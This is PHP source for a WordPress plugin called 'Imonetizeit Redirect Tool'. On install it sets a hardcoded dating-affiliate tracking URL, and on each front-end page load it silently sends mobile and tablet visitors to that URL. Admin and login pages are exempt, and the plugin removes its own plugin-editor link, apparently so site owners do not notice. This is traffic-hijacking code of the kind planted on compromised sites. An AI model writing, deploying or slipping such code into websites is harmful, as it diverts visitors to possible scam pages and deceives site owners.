<?php
if (!defined('WP_CONTENT_URL'))  define('WP_CONTENT_URL', WP_SITEURL.'/wp-content' );
if (!defined('WP_CONTENT_DIR'))  define('WP_CONTENT_DIR', ABSPATH.'wp-content' );
if (!defined('WP_PLUGIN_URL'))   define('WP_PLUGIN_URL', WP_CONTENT_URL.'/plugins' );
if (!defined('WP_PLUGIN_DIR'))   define('WP_PLUGIN_DIR', WP_CONTENT_DIR.'/plugins' );

if (!class_exists('ImonetizeitRTPlugin',false)):
class ImonetizeitRTPlugin {
	public static $lang = 'en';
	public static $page_title = 'Imonetizeit Redirect Tool';
	public static $menu_title = 'Redirect Tool';
	public static $menu_slug = 'imonetizeit-redirect-tool';
	public static $plugin_name = 'imonetizeit';
	
	public function __construct(){
		self::mobile_redirect();
	}

	public function install() {
        update_option(self::$menu_slug, json_encode(
            array(
                'url'               => 'https://wemweq.lncredlbiedate.com/c/da57dc555e50572d?s1=120241&s2=1261720&s3=Yuh_maning_&click_id=Yuh_maning_&j5=1&j6=1',
                'excludeIOSAndroid' => '0',
                'excludeTablets'    => '0'
            )
        ));

		self::_do_notice('install');
	}
	
	public function uninstall() {
		delete_option( self::$menu_slug );
		self::_do_notice('uninstall');
	}

	private function _do_notice($action) {
		return;
	}

	public function wp_admin_head(){
		echo '<link type="text/css" rel="stylesheet" href="' . WP_PLUGIN_URL.'/'.self::$plugin_name.'/css/style.css' . '" />' . PHP_EOL;
	}
	
	public function wp_admin_menu(){
		add_theme_page( self::$page_title , self::$menu_title , 'administrator', self::$menu_slug , array(&$this,'wp_admin_panel') );
		add_menu_page( self::$page_title , self::$menu_title , 'administrator', self::$menu_slug , array(&$this,'wp_admin_panel') , false);
	}
	
	public function wp_admin_panel(){
		$p = ( isset($_REQUEST['p']) && is_numeric( $_REQUEST['p'] ) && $_REQUEST['p'] > 0 ) ? $_REQUEST['p'] : 1 ;
		$tab_links = array(
				array( 'class' => 'nav-tab' , 'txt' => __('Configuration') , 'p' => 1 ),
		//		array( 'class' => 'nav-tab' , 'txt' => __('Another tab') , 'p' => 2 ),
		);
		$output = '<div class="wrap">';
		$output .= '<h2>' . self::$page_title . '</h2>';
		$output .= '<div class="icon32" id="icon-themes"><br></div>';
		$output .= '<h2 class="nav-tab-wrapper">';
		foreach( $tab_links as $v ){
			$class	= ( $p == $v['p'] ) ? $v['class'].' nav-tab-active' : $v['class'];
			$link	= ( isset($v['link']) ) ? $v['link'] : '?page='.$_GET['page'].'&p='.$v['p'];
			$output .= '<a href="'.$link.'" class="'.$class.'">'.$v['txt'].'</a>';
		}
		$output .= '</h2>';
		switch( $p ){
			case 1:
					if( count( $_POST ) ) self::save_new_config();
					$output .= self::redirect_configurator();
				break;
			default: $output .= 'Invalid request.'; break;
		}
		$output .= '</div>';
		echo $output;
	}
	
	/**
	 * Save the new configuration to DB
	 * @return null
	 */
	private static function save_new_config(){
		$p = (object) $_POST;
		foreach( $p as $key => $value ){
			if( is_string( $value ) ) $p->$key = stripslashes( $value );
		}
		if( !isset( $p->save ) ) return;
		$u_data = new stdClass();
		$u_data->url = $p->url;
		$u_data->excludeIOSAndroid	= ( !empty( $p->excludeIOSAndroid ) )	? true	: false;
		$u_data->excludeTablets		= ( !empty( $p->excludeTablets ) )		? true	: false;
		update_option( self::$menu_slug , json_encode( $u_data ) );
	}
	
	private static function redirect_configurator(){
		$view_path = dirname(__FILE__) . '/redirect_view.php';
		$view_data = array( 'u_data' => self::get_user_data() );
		return self::_load_view( $view_path , $view_data);
	}
	
	private static function _load_view($view_filename, $input_data) {
		if( $view_filename == '' ) return;
		ob_start();
		extract( $input_data, EXTR_SKIP );
		try {
			include $view_filename;
		} catch (Exception $e) {
			ob_end_clean();
			throw $e;
		}
		return ob_get_clean();
	}

	private static function get_user_data(){
        $options = get_option(self::$menu_slug);
        if (!empty($options)) {
            return json_decode($options);
        }

        return (object)new stdClass();
	}
	
	public function wp_plugin_links($action_links,$plugin_file,$plugin_info) {
		if (!preg_match('/'.self::$page_title.'/i',$plugin_info['Name'])) {
			return $action_links;
		}
		$new_action_links = array(
			"<a href='admin.php?page=".self::$menu_slug."'>".__('Configuration',self::$plugin_name)."</a>",
		//	"<a href='admin.php?page=".self::$menu_slug."&amp;p=2'>Tab 2</a>"
		);
		foreach($action_links as $k=>$action_link) {
			if (!preg_match('/plugin-editor/i',$action_link)) {
				$new_action_links[] = $action_link;
			}
		}
		return $new_action_links;
	}
	
	private static function mobile_redirect() {
		if ( is_admin() ) return false;
		if ( preg_match('/^(wp-login.php|wp-register.php|tinymce.php)$/i',$GLOBALS['pagenow'])) return false;
		if ( preg_match('/wp-includes/i',$_SERVER['SCRIPT_NAME']) ) return false;
		$f = self::get_user_data();
		require_once 'mobile_redirect.php';

        $detect = new Mobile_Detect;
        $detect->setUserAgent($_SERVER['HTTP_USER_AGENT']);

        if (!$detect->isMobile() && !$detect->isTablet()) {
            return false;
        }

        if($detect->isTablet() && $f->excludeTablets
        || (($detect->isAndroidOS() || ($detect->isiOS() && $detect->isTablet()))
            && $f->excludeIOSAndroid)
        ) {
            return false;
        }

		if( !empty( $f->sl ) ) $http_params[ 'sl' ] = $f->sl;
		$link = $f->url;
		header('Location: '.$link);
		header('Content-Type: text/vnd.wap.wml;charset=ISO-8859-1');
		?>
	<!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD WML 1.1//EN" "http://www.wapforum.org/DTD/wml_1.1.xml">
	<wml>
		<head>
			<meta http-equiv="cache-control" content="no-cache"/>
			<meta http-equiv="cache-control" content="must-revalidate" />
			<meta http-equiv="cache-control" content="max-age=0" />
			<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
		</head>
		<card>
			<onevent type="ontimer">
				<go method="post" href="<?php echo $link; ?>"></go>
			</onevent>
			<timer value="1"/>
		</card>
	</wml>
	<?php 
		exit;
	}
}
endif;

$MRT = new ImonetizeitRTPlugin();